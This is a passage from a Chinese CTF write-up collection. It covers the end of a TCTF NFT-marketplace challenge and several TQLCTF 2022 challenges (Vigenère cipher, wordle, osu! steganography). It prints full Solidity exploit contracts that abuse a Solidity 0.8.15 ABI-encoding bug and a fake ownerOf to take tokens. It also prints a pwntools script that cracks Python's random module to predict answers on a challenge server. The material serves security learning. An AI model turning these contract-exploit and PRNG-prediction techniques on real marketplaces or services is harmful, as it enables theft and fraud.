\u53f7\u4ee3\u5e01\u9a97\u94b1\u7684\u539f\u56e0\u662f\u8fd9\u6837\u4f1a\u5bfc\u81f4 1 \u53f7\u4ee3\u5e01\u65e0\u6cd5\u518d\u56de\u6536\uff09 3 \u53f7\u4ee3\u5e01\u901a\u8fc7 CouponVerifierBeta \u7684\u6f0f\u6d1e\uff0c\u5728 ownerOf \u91cc\u8c03\u7528\u5220\u9664\u8ba2\u5355\u4f7f\u8ba2\u5355\u961f\u5217\u4e71\u5e8f\uff0c\u4ece\u800c\u7528\u6b63\u786e\u7684\u4f18\u60e0\u5238\u548c\u4ef7\u683c\u4e70\u5230\u5176\u5b83\u8ba2\u5355\u4e2d\u7684\u4ee3\u5e01 1\u30012 \u53f7\u83b7\u53d6\u7684\u6d41\u7a0b\u5df2\u7ecf\u5f88\u6e05\u6670\u4e86\uff0c\u800c\u4e14\u5176\u987a\u5e8f\u5e76\u4e0d\u5f71\u54cd\uff0c\u53ef\u4ee5\u968f\u65f6\u901a\u8fc7\u5bf9\u5e94\u65b9\u6cd5\u83b7\u5f97\u3002\u4e0b\u9762\u4e3b\u8981\u8bf4 3 \u53f7\u4ee3\u5e01\uff0c\u4e5f\u5c31\u662f\u6700\u7cbe\u5f69\u7684\u90e8\u5206\uff1a \u8fd9\u4e2a\u4ee3\u5e01\u7684\u83b7\u53d6\u65b9\u6cd5\u80af\u5b9a\u662f\u901a\u8fc7 purchaseWithCoupon \u65b9\u6cd5\uff0c\u518d\u634b\u4e00\u4e0b\u8c03\u7528\u7684\u6574\u4e2a\u8fc7\u7a0b\uff1a \u53d6\u51fa\u53c2\u6570\u4e2d\u7684 coupon \u9a8c\u8bc1 user\uff08\u4f7f\u7528\u8005\uff09\u662f\u5426\u662f\u8c03\u7528\u8005\uff0cnewprice \u662f\u5426\u5927\u4e8e 0 \u8c03\u7528 verifier.verifyCoupon \u65b9\u6cd5 \u53d6\u51fa coupon\u3001sig\u3001order\uff08\u8ba2\u5355\u5168\u90e8\u5185\u5bb9\uff09 \u6784\u9020\u5e8f\u5217\u5316\u4fe1\u606f \u8c03\u7528 order.nftAddress \u4e0a\u7684 ownerOf \u65b9\u6cd5\u83b7\u5f97 owner \u9a8c\u8bc1 issuer\uff08\u4e0b\u53d1\u4f18\u60e0\u5238\u7684\u4eba\uff09\u662f\u5426\u662f owner \u9a8c\u8bc1\u7b7e\u540d\u662f\u5426\u662f issuer \u4e3a\u5e8f\u5217\u5316\u4fe1\u606f\u7b7e\u7f72\u7684 \u6839\u636e coupon.orderId \u53d6\u51fa\u5e76\u5220\u9664\u8ba2\u5355 \u8c03\u7528 order.nftAddress \u4e0a\u7684 ownerOf \u65b9\u6cd5\u83b7\u5f97 owner coupon.user \u5411 owner \u8f6c coupon.newprice \u4e2a TTK owner \u5c06 order.tokenId \u8fd9\u4e2a\u4ee3\u5e01\u8f6c\u7ed9 coupon.user \u5176\u4e2d coupon \u63d0\u53d6\u7684\u65f6\u673a\u5f88\u5173\u952e\uff1a \u5728 purchaseWithCoupon \u65b9\u6cd5\u5f00\u5934\u5c31\u63d0\u53d6\u4e86 coupon \u5168\u90e8\u5185\u5bb9\u5230\u5185\u5b58\u4e2d\uff0c\u56e0\u6b64 verifier.verifyCoupon \u8fd4\u56de\u540e coupon.orderId\u3001coupon.user \u4e0d\u4f1a\u53d8 \u5728 verifier.verifyCoupon \u65b9\u6cd5\u4e2d\u4e5f\u662f\u5f00\u5934\u5c31\u63d0\u53d6\u4e86 coupon \u5168\u90e8\u5185\u5bb9\uff0c\u5e76\u5728 ownerOf \u8c03\u7528\u524d\u5c31\u521b\u5efa\u4e86\u5bf9\u5e94\u7684\u5e8f\u5217\u5316\u4fe1\u606f \u9519\u8bef\u7684\u65b9\u6cd5 \u6240\u4ee5\u53ea\u8981\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684\u8ba2\u5355\uff08nftAddress \u662f\u81ea\u5df1\u90e8\u7f72\u7684\u6709\u95ee\u9898\u7684\u5408\u7ea6\uff09\uff0c\u901a\u8fc7\u67d0\u4e9b\u65b9\u6cd5\u8ba9\u5176\u987a\u5e8f\u53d8\u5230 3 \u53f7\u4ee3\u5e01\u5bf9\u5e94\u8ba2\u5355\u4e4b\u524d\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728 verifier.verifyCoupon \u65b9\u6cd5\u4e2d\u8c03\u7528 ownerOf \u65f6\u5728\u5176\u5185\u90e8\u5220\u9664\u6389\u8fd9\u4e2a\u8ba2\u5355\uff0c\u5bfc\u81f4\u540e\u9762\u901a\u8fc7 getOrder(coupon.orderId).tokenId \u83b7\u53d6\u5230\u7684\u5b9e\u9645\u4e0a\u662f 3 \u53f7\u4ee3\u5e01 \u8fd9\u6837\u56de\u5230 purchaseWithCoupon \u65b9\u6cd5\u4e4b\u540e\u53d6\u51fa\u4e86\u8ba2\u5355\uff08\u552e\u5356\u7684 tokenId \u662f 3\uff0cnftAddress \u4e5f\u662f\u5546\u573a\u4e2d\u7684 NFT \u5730\u5740\uff09\u4ed8\u6b3e\u53ea\u9700\u4ed8 coupon.newprice \u8fd9\u4e48\u591a\u5c31\u53ef\u4ee5\u5f97\u5230 3 \u53f7\u4ee3\u5e01\u3002 \u4e71\u5e8f\u7684\u65b9\u6cd5\u662f\uff1a \u8d77\u59cb\uff1a1 2 3 \u589e\u52a0\u4e00\u4e2a\u81ea\u5df1\u7684\uff1a1 2 3 4 \u4e70\u4e0b 2\uff1a1 4 3\uff08\u6b64\u65f6\u81ea\u5df1\u7684\u8ba2\u5355\u5728 3 \u524d\uff09 \u4e0d\u8fc7\u4e0a\u9762\u8fd9\u4e2a\u65b9\u6cd5\u662f\u6709\u95ee\u9898\u7684\uff0c\u4fee\u6539 ownerOf \u5728\u5176\u4e2d\u5220\u9664\u8ba2\u5355\u7684\u8bdd\u4f1a\u5bfc\u81f4\u8fd9\u4e2a\u65b9\u6cd5\u5e76\u4e0d\u662f view \u65b9\u6cd5\uff0c\u9700\u8981\u4f7f\u7528 call \u800c\u4e0d\u662f staticcall \u8c03\u7528\u3002\u4f46\u662f\u901a\u8fc7 IERC721 \u5f97\u5230\u7684\u63a5\u53e3\u662f view \u7684\uff0c\u4f1a\u4f7f\u7528 staticcall \u8c03\u7528\uff0c\u4ece\u800c\u5bfc\u81f4 revert \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\u5728\u4e8e\u9898\u76ee\u6307\u5b9a\u4e86 solidity \u7f16\u8bd1\u5668\u7248\u672c\u4e3a 0.8.15\u3002\u8fd9\u4e2a\u7248\u672c\u7684\u7f16\u8bd1\u5668\u5b58\u5728\u4e00\u4e2a bug\u3002\u6765\u81ea solidity 0.8.16 release post \uff1a Important Bugfixes: Code Generation: Fix data corruption that affected ABI-encoding of calldata values represented by tuples: structs at any nesting level; argument lists of external functions, events and errors; return value lists of external functions. The 32 leading bytes of the first dynamically-encoded value in the tuple would get zeroed when the last component contained a statically-encoded array. \u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u5728\u8c03\u7528 verifyCoupon \u65b9\u6cd5\u65f6\u5176\u63a5\u6536\u5230\u7684 scoupon \u7684\u524d 32 \u5b57\u8282\u4f1a\u53d8\u6210\u5168 0\uff0c\u800c\u5bf9\u5e94\u7ed3\u6784\u4f53\u4e2d\u8fd9\u4e2a\u4f4d\u7f6e\u521a\u597d\u662f orderId\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u65e0\u8bba\u5982\u4f55 verifyCoupon \u7684\u59cb\u7ec8\u662f\u7b2c\u4e00\u4e2a\u8ba2\u5355\u4e0a\u7684\u4fe1\u606f\u3002\u56e0\u6b64\u6211\u4eec\u8ba2\u5355\u5217\u8868\u7684\u987a\u5e8f\u5c31\u53ef\u4ee5\u662f\uff1a \u521d\u59cb\uff1a1 2 3 \u65b0\u5efa\uff1a1 2 3 4 \u4e70\u4e0b 1\uff1a4 2 3 \u4e70\u4e0b 2: 4 3 \u6240\u4ee5\u6700\u7ec8\u9a8c\u8bc1\u7684\u8fd8\u662f\u6211\u4eec\u81ea\u5df1\u8ba2\u5355\u4e0a\u7684\u4fe1\u606f\uff0c\u800c owner \u539f\u672c\u662f\u653b\u51fb\u5408\u7ea6\uff0c\u4e0d\u8fc7\u7b7e\u7f72\u8005\u53ea\u80fd\u662f\u7528\u6237\u8d26\u6237\uff0c\u6240\u4ee5\u9700\u8981\u4f2a\u9020\u4e00\u4e0b\uff0c\u7528\u4e00\u4e2a\u7528\u6237\u8d26\u6237\u7b7e\u7f72\u5f97\u5230\u7b7e\u540d\uff0c\u5e76\u5728 ownerOf \u7684\u65f6\u5019\u8fd4\u56de\u8fd9\u4e2a\u7b7e\u7f72\u8005\u5730\u5740\uff08\u8fd9\u6837 ownerOf \u65b9\u6cd5\u8fd8\u662f view \u7684\uff0c\u53ef\u4ee5 staticcall\uff09 \u6838\u5fc3\u4ee3\u7801 ExploitNFT contract ExploitNFT is Context , ERC165 { ... address public fake_issuer ; function set_fake_issuer ( address src ) public { fake_issuer = src ; } function ownerOf ( uint256 tokenId ) public virtual returns ( address ) { if ( fake_issuer != address ( this )) { address fake = fake_issuer ; return fake ; } else { address owner = _owners [ tokenId ]; return owner ; } } ... } Exploit contract Exploit { TctfMarket public market ; TctfNFT public myNFT ; ExploitNFT public expNFT ; address public issuer ; constructor ( address chal , address issuer_ ) { issuer = issuer_ ; market = TctfMarket ( chal ); myNFT = new TctfNFT (); expNFT = new ExploitNFT ( \"ExploitNFT\" , \"ENFT\" , chal ); } function airdrop () public { market . tctfToken (). airdrop (); } function buyToken1 () public returns ( bool ) { market . tctfToken (). approve ( address ( market ), 1 ); market . purchaseOrder ( 0 ); return market . tctfNFT (). ownerOf ( 1 ) == address ( this ); } function getTokenFromMarket () public { myNFT . mint ( address ( this ), 1 ); myNFT . setApprovalForAll ( address ( market ), true ); market . purchaseTest ( address ( myNFT ), 1 , 1337 ); } function buyToken2 () public returns ( bool ) { market . tctfToken (). approve ( address ( market ), 1337 ); market . purchaseOrder ( 1 ); return market . tctfNFT (). ownerOf ( 2 ) == address ( this ); } function createNewOrder () public { expNFT . mint ( address ( this ), 1 ); market . createOrder ( address ( expNFT ), 1 , 1 ); } function buyToken3 ( uint8 v , bytes32 [ 2 ] calldata rs ) public returns ( bool ) { market . tctfToken (). approve ( address ( market ), 1 ); expNFT . setApprovalForAll ( address ( market ), true ); expNFT . set_fake_issuer ( issuer ); require ( market . getOrder ( 0 ). nftAddress == address ( expNFT ), \"not valid\" ); require ( market . getOrder ( 1 ). nftAddress == address ( market . tctfNFT ()), \"not valid\" ); require ( address ( market . tctfNFT ()) != address ( expNFT ), \"not valid\" ); market . purchaseWithCoupon ( SignedCoupon ( Coupon ( 1 , // orderId 1 , // newprice issuer , // issuer address ( this ), // user bytes ( \"exploit\" ) ), Signature ( v , rs ) )); return market . tctfNFT (). ownerOf ( 3 ) == address ( this ); } function getSerialized () public returns ( bytes32 ) { Coupon memory coupon ; Order memory order ; order . nftAddress = address ( expNFT ); order . tokenId = 1 ; order . price = 1 ; coupon . user = address ( this ); coupon . issuer = issuer ; coupon . newprice = 1 ; coupon . reason = bytes ( \"exploit\" ); bytes memory serialized = abi . encode ( \"I, the issuer\" , coupon . issuer , \"offer a special discount for\" , coupon . user , \"to buy\" , order , \"at\" , coupon . newprice , \"because\" , coupon . reason ); return keccak256 ( serialized ); } function check ( uint8 v , bytes32 [ 2 ] calldata rs ) public returns ( bool ) { return ecrecover ( getSerialized (), v , rs [ 0 ], rs [ 1 ]) == issuer ; } function exp1 () public returns ( bool ) { airdrop (); createNewOrder (); getTokenFromMarket (); if ( ! buyToken1 ()) return false ; if ( ! buyToken2 ()) return false ; return true ; } function exp2 ( uint8 v , bytes32 [ 2 ] calldata rs ) public returns ( bool ) { if ( ! buyToken3 ( v , rs )) return false ; market . win (); return true ; } function onERC721Received ( address , address , uint256 , bytes memory ) public pure returns ( bytes4 ) { return this . onERC721Received . selector ; } } \u518d\u914d\u5408 web3.py \u8fdb\u884c\u4ea4\u4e92\u5373\u53ef\uff08\u7b7e\u7f72\u4e5f\u5728\u8fd9\u91cc\u5b8c\u6210\uff09 flag: flag{off_by_null_in_the_market_d711fbd6a7c0c015b42d}","title":"TCTF NFT Market"},{"location":"writeups/tqlctf2022/","text":"TQLCTF 2022 Writeup \u00b6 Abstract \u6e05\u534e\u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u57fa\u672c\u90fd\u662f NanoApe \u51fa\u7684\uff0c\u8d28\u91cf\u9ad8\u7684\u5f88 nano \u7684\u5b98\u65b9 writeup Ranma\u00bd \u00b6 \u6253\u5f00 flag \u5341\u516d\u8fdb\u5236\uff0c\u662f\u4e00\u4e2a\u975e\u6807\u51c6\u7684 UTF-8 \u7f16\u7801\uff0c\u4e5f\u5c31\u662f\u90e8\u5206\u53ef\u4ee5\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u7684\uff0c\u5199\u6210\u4e86\u7b26\u5408 UTF-8 \u7f16\u7801\u539f\u7406\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u5bfc\u81f4\u7f16\u8f91\u5668\u65e0\u6cd5\u6b63\u5e38\u8bfb\u53d6\uff08\u4f46\u662f vim \u80fd\u8bfb\u53d6\uff09 \u53ef\u4ee5\u5f97\u5230\u4e00\u4e32\u5bc6\u6587\uff1a KGR/QRI 10646-1 zswtqgg d tnxcs tsdtofbrx osk ndnzhl gna Ietygfviy Idoilfvsu Arz (QQJ) hkkqk maikaglvusv ubyp cw ekg krzyj'o kitwkbj alypsdd. Wjs rzvmebrwoa duwcuosu pqecgqamo cw ekg IFA, uussmpu, ysum aup qfxschljyk swks pcbb khxnsee drdoqpgpwfyv cbg xeupctzou, oql gneg ylv nsg bb zds upygzrxzkjh fq XVT-8, wpr uxxvnw qt wpvy isdz. XVT-8 kif zds tsdtofbrxegktf qt szryafmtqi hkm sahz LD-DUQLQ egjuv, auqjllvtc qfxschljvrehp hlvv iqyk omjehog, sieyafj lqf cwprx ocwezcfh bugp fvwb qb XA-NYYWZ gdniha oap oip wtoqacgnsee wq cwprx rocfhu. HTTPZB{QFOLP6_KRZ1Q} \u5f88\u5bb9\u6613\u731c\u6d4b\u5f00\u5934\u5e94\u8be5\u662f ISO/IEC 10646-1\uff0c\u800c\u80fd\u5c06 I \u52a0\u5bc6\u4e3a\u4e0d\u540c\u5b57\u7b26\uff0c\u60f3\u5230\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 \u67e5\u5230\u539f\u6587\u662f RFC 3629 \u7684 abstract: ISO/IEC 10646-1 defines a large character set called the Universal Character Set (UCS) which encompasses most of the world's writing systems. The originally proposed encodings of the UCS, however, were not compatible with many current applications and protocols, and this has led to the development of UTF-8, the object of this memo. UTF-8 has the characteristic of preserving the full US-ASCII range, providing compatibility with file systems, parsers and other software that rely on US-ASCII values but are transparent to other values. \u53cd\u63a8\u51fa key\uff1a CODINGWORLD \u89e3\u5bc6\u5f97\u5230\u7ed3\u5c3e\u7684 flag\uff1a TQLCTF{CODIN6_WOR1D} wordle \u00b6 wordle \u6e38\u620f\uff0c\u8981\u6c42 512 \u5c40\u5168\u90e8\u731c\u5bf9 \u5148\u5199\u4e86\u4e00\u4e2a solver\uff0c\u6539\u5199\u7684 zulkarnine/WordleSolver easy \u548c normal \u96be\u5ea6\u5747\u6ca1\u6709 flag \u76f8\u5173\u4fe1\u606f\uff0c\u6240\u4ee5\u8981\u89e3\u51fa insane \u96be\u5ea6\uff0c\u5373 512 \u5c40\u5168\u90e8\u63a7\u5236\u5728 4 \u6b21\u4ee5\u5185\u731c\u51fa\u6765\uff0c\u4e0d\u73b0\u5b9e\uff0c\u627e\u5176\u5b83\u65b9\u6cd5 \u53d1\u73b0\u6bcf\u5c40\u90fd\u4f1a\u5148\u7ed9\u51fa\u4e00\u4e2a hex \u503c\uff0c\u800c\u4e14\u7b97\u6cd5\u5df2\u77e5\uff0c\u5e76\u4e14\u7531\u9898\u76ee\u6587\u4ef6\u4e2d\u6ce8\u91ca # To prevent the disclosure of answer \u77e5\u9053\u53cd\u63a8\u7b54\u6848\u4e0d\u73b0\u5b9e \u518d\u8003\u8651\u5230\u6574\u4e2a\u9898\u76ee\u662f\u5728\u4e00\u4e2a while True \u4ee5\u5185\u7684\uff0c\u89e3\u51fa\u4e00\u4e2a\u96be\u5ea6\u540e\u4e0d\u4f1a\u5173\u6389\u9898\u76ee\uff0c\u800c\u662f\u53ef\u4ee5\u7ee7\u7eed\u9009\u62e9\u96be\u5ea6\u7ee7\u7eed\u89e3\u9898 \u6240\u4ee5\u5b58\u5728\u7206\u7834 random \u6a21\u5757\u4f2a\u968f\u673a\u6570\u7684\u53ef\u80fd \u56e0\u4e3a hex \u503c\u7b97\u6cd5\u5df2\u77e5\uff1a id = random . randrange ( len ( valid_words ) * ( 2 ** 20 )) answer = valid_words [ id % len ( valid_words )] id = ( id // len ( valid_words )) ^ ( id % len ( valid_words )) return hex ( id )[ 2 :] . zfill ( 5 ), answer \u5982\u679c\u77e5\u9053\u7b54\u6848\u5219\u76f8\u5f53\u4e8e\u77e5\u9053 id % len(valid_words) \uff0c\u518d\u4e0e hex \u503c\u5f02\u6216\u53ef\u4ee5\u5f97\u5230 id // len(valid_words) \uff0c\u800c len(valid_words) \u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u63a8\u5f97 id \uff0c\u5373 randrange \u7684\u7ed3\u679c \u7206\u7834 random \u4f7f\u7528 tna0y/Python-random-module-cracker \uff0c\u9700\u8981 512 \u4e2a random \u7684\u7ed3\u679c \u8fdb\u884c\u4e24\u8f6e easy \u96be\u5ea6\uff08\u4f7f\u7528 solver\uff09\u5c31\u53ef\u4ee5\u5f97\u5230\u8fde\u7eed 512 \u4e2a\u4f2a\u968f\u673a\u6570\uff0c\u4f46\u662f\u5b58\u5728\u7206\u7834\u51fa\u9519\u7684\u53ef\u80fd\uff0c\u7b2c\u4e8c\u8f6e\u7684\u540e 400 \u4e2a\u53ef\u4ee5\u7528\u6765\u9a8c\u8bc1 \u5982\u679c\u540e 400 \u4e2a\u5b8c\u5168\u9884\u6d4b\u6b63\u786e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c insane \u96be\u5ea6\uff0c\u76f4\u63a5\u9884\u6d4b\u968f\u673a\u6570\u8ba1\u7b97\u5f97\u5230\u7b54\u6848 \u5b8c\u6574\u4ee3\u7801 import re import sys from pwn import * from tqdm import tqdm from enum import Enum from collections import Counter from randcrack import RandCrack MAX_ATTEMPT = 6 class LetterVerdict ( Enum ): GREEN = 1 YELLOW = 2 GRAY = 3 class AttemptVerdict ( Enum ): WON = 1 LOST = 2 FAILED_ATTEMPT = 3 INVALID_TRY = 4 INVALID_WORD = 5 def get_all_wordle_words (): with open ( \"valid_words.txt\" , \"r\" ) as infile : return [ line . strip () for line in infile . readlines ()] class WordleSolver : def __init__ ( self ): self . __all_possible_words = set ( get_all_wordle_words ()) self . __invalid_letters = set () self . __untried_letters = set () self . __candidate_words = [] self . __green_blocks = set () self . __yellow_blocks = set () self . attempt = 0 self . game_number = - 1 self . tries = [] self . reset () def reset ( self ): self . __invalid_letters . clear () self . __candidate_words = sorted ( list ( self . __all_possible_words )) self . __yellow_blocks . clear () self . __green_blocks . clear () self . attempt = 0 self . __untried_letters = set ( chr ( ord ( 'a' ) + i ) for i in range ( 26 )) self . game_number += 1 self . tries . clear () def __contains_forbidden_letters ( self , word ): for ind , c in enumerate ( word ): if ( c , ind ) not in self . __green_blocks : # here fix a bug in if c in self . __invalid_letters : # the original solver return True return False def __get_untried_letter_probability ( self , words ): counter = Counter () for w in words : for c in w : if c in self . __untried_letters : counter [ c ] += 1 return counter def __get_letter_freq_map ( self , words ): counter = Counter () for w in words : for c in w : counter [ c ] += 1 return counter def __matches_green_constraints ( self , word ): for letter , index in self . __green_blocks : if word [ index ] != letter : return False return True def __matches_yellow_constraints ( self , word ): for letter , index in self . __yellow_blocks : if word [ index ] == letter or letter not in word : return False return True def __filter_out_invalid_words ( self ): new_candidates = [] for word in self . __candidate_words : if self . __contains_forbidden_letters ( word ) or not self . __matches_green_constraints ( word ) or not self . __matches_yellow_constraints ( word ): continue new_candidates . append ( word ) self . __candidate_words = new_candidates def __make_educated_guess ( self ): untried_letters = self . __get_untried_letter_probability ( self . __candidate_words ) freq_map = self . __get_letter_freq_map ( self . __candidate_words ) if len ( untried_letters ) > 1 and self . attempt <= MAX_ATTEMPT - 1 : word_with_score = [] word_list = self . __all_possible_words for word in word_list : letters = set ( word ) untried_score = sum ( untried_letters [ c ] if c in untried_letters else 0 for c in letters ) freq_score = sum ( freq_map [ c ] for c in letters ) word_with_score . append (( word , untried_score , freq_score )) ranked_words = sorted ( word_with_score , key = lambda item : ( - item [ 1 ], - item [ 2 ], item [ 0 ])) guess = ranked_words [ 0 ][ 0 ] else : guess = sorted ( self . __candidate_words , key = lambda word : ( - len ( set ( word )), - sum ( freq_map [ c ] for c in word ), word ) )[ 0 ] return guess def __pick_a_word ( self ): self . __filter_out_invalid_words () if len ( self . __candidate_words ) == 0 : # for debug res = input ( \">>> \" ) return res . strip () elif len ( self . __candidate_words ) == 1 : return self . __candidate_words [ 0 ] return self . __make_educated_guess () def solve ( self , wordle ): last_guess = \"\" wordle . p . recvuntil ( b \"#\" ) hex_id = wordle . p . recvline () . decode ( \"utf-8\" ) . strip () while True : self . attempt += 1 guess = self . __pick_a_word () if last_guess == guess : # here fix a bug in the original solver self . __candidate_words . remove ( guess ) guess = self . __pick_a_word () result , letter_verdicts = wordle . guess ( guess ) last_guess = guess self . tries . append ( guess ) if result == AttemptVerdict . WON : return hex_id , guess elif result == AttemptVerdict . LOST : return False elif result == AttemptVerdict . FAILED_ATTEMPT : for chr in guess : self . __untried_letters . discard ( chr ) for i in range ( len ( letter_verdicts )): letter , verdict = letter_verdicts [ i ] if verdict == LetterVerdict . GRAY : flag = True for ( l , _ ) in self . __yellow_blocks : # here fix a bug in if l == letter : # the original solver flag = False break if flag : self . __invalid_letters . add ( letter ) elif verdict == LetterVerdict . GREEN : self . __green_blocks . add (( letter , i )) if ( letter , i ) in self . __yellow_blocks : self . __yellow_blocks . remove (( letter , i )) elif verdict == LetterVerdict . YELLOW : self . __yellow_blocks . add (( letter , i )) else : exit ( 1 ) elif result == AttemptVerdict . INVALID_WORD : self . attempt -= 1 self . __candidate_words . remove ( guess ) self . __all_possible_words . remove ( guess ) class Wordle : def __init__ ( self , mode ): self . p = connect ( \"47.106.102.129\" , 23370 ) self . p . sendlineafter ( b \"> \" , str ( mode ) . encode ( \"utf-8\" )) def restart ( self , mode ): self . p . sendlineafter ( b \"> \" , str ( mode ) . encode ( \"utf-8\" )) def guess ( self , word ): self . p . sendlineafter ( b \"> \" , word . encode ( \"utf-8\" )) status = self . p . recvuntil ( b \"!\" ) if status == b \"Correct!\" : return AttemptVerdict . WON , None result = self . p . recvline () . decode ( \"utf-8\" ) res = re . findall ( r \"\\[4(\\d)m\" , result ) ret = [] for i in range ( 5 ): c = word [ i ] if res [ i ] == \"7\" : ret . append (( c , LetterVerdict . GRAY )) elif res [ i ] == \"3\" : ret . append (( c , LetterVerdict . YELLOW )) else : ret . append (( c , LetterVerdict . GREEN )) attempt_verdict = AttemptVerdict . WON for _ , verdict in ret : if verdict != LetterVerdict . GREEN : attempt_verdict = AttemptVerdict . FAILED_ATTEMPT break return attempt_verdict , ret cracker = RandCrack () wordle = Wordle ( 0 ) solver = WordleSolver () def calc_random_id ( hex_id , word ): valid_words = get_all_wordle_words () length = len ( valid_words ) index = valid_words . index ( word ) # id % len(valid_words) Id = eval ( \"0x\" + hex_id ) tmp = Id ^ index # id // len(valid_words) return tmp * length + index def calc_hex_id_and_word ( random_value ): valid_words = get_all_wordle_words () length = len ( valid_words ) word = valid_words [ random_value % length ] hex_value = ( random_value // length ) ^ ( random_value % length ) return hex ( hex_value )[ 2 :] . zfill ( 5 ), word with tqdm ( total = 624 , desc = \"Cracking random...\" ) as pbar : for i in range ( 512 ): solver . reset () hex_id , answer = solver . solve ( wordle ) random_value = calc_random_id ( hex_id , answer ) cracker . submit ( random_value ) pbar . update ( 1 ) wordle . restart ( 0 ) for i in range ( 112 ): solver . reset () hex_id , answer = solver . solve ( wordle ) random_value = calc_random_id ( hex_id , answer ) cracker . submit ( random_value ) pbar . update ( 1 ) with tqdm ( total = 400 , desc = \"Verifying crack result...\" ) as pbar : for i in range ( 400 ): solver . reset () predict = cracker . predict_randrange ( 4090 * ( 2 ** 20 )) p_hex_id , p_answer = calc_hex_id_and_word ( predict ) hex_id , answer = solver . solve ( wordle ) if p_hex_id != hex_id : print ( f \"Crack faild: \\n predict: { p_hex_id } , { p_answer } \\n challenge: { hex_id } , { answer } \" ) sys . exit ( 1 ) pbar . update ( 1 ) wordle . p . sendlineafter ( b \"> \" , b \"3\" ) # insane level with tqdm ( total = 512 , desc = \"Solving insane level...\" ) as pbar : for i in range ( 512 ): wordle . p . recvuntil ( b \"#\" ) hex_id = wordle . p . recvline () . decode ( \"utf-8\" ) . strip () predict = cracker . predict_randrange ( 4090 * ( 2 ** 20 )) p_hex_id , p_answer = calc_hex_id_and_word ( predict ) if hex_id != p_hex_id : print ( f \"Predict failed: \\n predic: { p_hex_id } \\n challenge: { hex_id } \" ) sys . exit ( 1 ) wordle . p . sendlineafter ( b \"> \" , p_answer . encode ( \"utf-8\" )) pbar . update ( 1 ) wordle . p . interactive () the Ohio State University \u00b6 \u9898\u76ee\u63d0\u4f9b\u4e86 .osz \u6587\u4ef6\uff0c\u662f osu! \u6e38\u620f\u8c31\u9762\u7684\u538b\u7f29\u6587\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6e38\u620f\u76f4\u63a5\u6253\u5f00\uff0c\u6216\u8005\u89e3\u538b\u83b7\u5f97\u7d20\u6750\u6587\u4ef6 \u5728osu\u5b98\u7f51\u641c\u7d22\u5230\u5bf9\u5e94\u7684\u8c31\u9762\u5e76\u4e0b\u8f7d\uff1a https://osu.ppy.sh/beatmapsets/1235288#mania/2568956 \u5c06\u4e24\u4efd\u8c31\u9762\u89e3\u538b\uff0c\u6bd4\u8f83\u6587\u4ef6\u4e0d\u540c \u80cc\u666f\u56fe\u7247\u7684 exif \u91cc\u6709\u4e00\u9879\u5c5e\u6027\uff1a pwd: VVelcome!! \u63a8\u6d4b\u56fe\u7247\u4f1a\u6709\u5e26\u5bc6\u7801\u7684\u9690\u85cf\u5185\u5bb9\uff0csteghide \u89e3\u5bc6\u5f97\u5230 flag \u5f00\u5934\uff1a TQLCTF{VVElcOM3 BASIC \u96be\u5ea6\u8c31\u9762\u6587\u4ef6\u6709\u4e00\u884c\u5dee\u5f02\uff1a WAVPassword: MisoilePunch \u6697\u793a\u4e86 wav \u97f3\u9891\u6587\u4ef6\u4f1a\u6709\u9690\u85cf\u5185\u5bb9\uff0c\u4f7f\u7528 SilentEye \u5373\u53ef\u63d0\u53d6 \u62ff\u5230 flag \u4e2d\u95f4\u90e8\u5206 _TO_O$u_i7s_ \u6700\u540e\u8fd8\u5269\u4e0b VIVID \u96be\u5ea6\u8c31\u9762\uff0c\u6bd4\u5bf9\u53d1\u73b0\u8c31\u9762\u5c3e\u6740\u88ab\u6539\u4e86 \u5269\u4e0b\u4e00\u90e8\u5206\u662f flag \u7684\u7ed3\u5c3e\uff0c\u6240\u4ee5\u7ed3\u5c3e\u5e94\u8be5\u662f }\uff0c\u5176\u5bf9\u5e9416\u8fdb\u5236\u503c\u4e3a 7D\uff0c\u4e8c\u8fdb\u5236 0111 1101\uff0c\u53d1\u73b0\u7ed3\u5c3e\u786e\u5b9e\u6709\u7c7b\u4f3c 0111 1101 \u7684 note \u7136\u540e\u8bb0\u5f55\u6240\u6709 note\uff0c\u8f6c\u6362\u4e3a\u5b57\u7b26\u5c31\u53ef\u4ee5\u62ff\u5230\u6700\u540e\u4e00\u90e8\u5206flag\uff1a5HoWtIme} \u62fc\u63a5\u5f97\u5230\u5b8c\u6574flag\uff1aTQLCTF{VVElcOM3_TO_O$u_i7s_5HoWtIme} Nanomaze \u00b6 \u662f nano \u590d\u523b\u7684 revomaze green \u8ff7\u5bab \u4e3b\u8981\u73a9\u6cd5\u5c31\u662f\u6574\u4e2a\u5730\u56fe\u5728\u5de6\u53f3\u65b9\u5411\u4e0a\u662f\u5faa\u73af\u7684\uff08\u5730\u56fe\u5377\u6210\u4e00\u4e2a\u5706\u7b52\uff09 \u6574\u4e2a\u8ff7\u5bab\u5730\u56fe\u5305\u542b\u9ad8\u5ea6\uff0c\u6bcf\u6b21\u53ea\u80fd\u5411\u540c\u9ad8\u5ea6\u8d70\uff0c\u9ad8\u5ea6\u4e0b\u964d\u4e86\u5c31\u4f1a\u6536\u5230 [click] \u63d0\u793a\uff0c\u8fd9\u4e4b\u540e\u4e5f\u5c31\u4e0d\u80fd\u518d\u539f\u8def\u8fd4\u56de\u4e86 \u5e76\u4e14\u6709\u7279\u6b8a\u4f4d\u7f6e\u53ef\u4ee5\u4f7f\u9ad8\u5ea6\u4e0a\u5347\uff08\u7b2c\u4e00\u884c\u67d0\u5904\uff09 \u76ee\u6807\u662f\u5230\u8fbe\u5730\u56fe\u7684\u6700\u4e0b\u9762\u4e00\u5c42\u7684\u67d0\u4e2a\u4f4d\u7f6e \u7531\u4e8e\u5de6\u53f3\u5faa\u73af\uff0c\u6240\u4ee5\u5148\u627e\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f 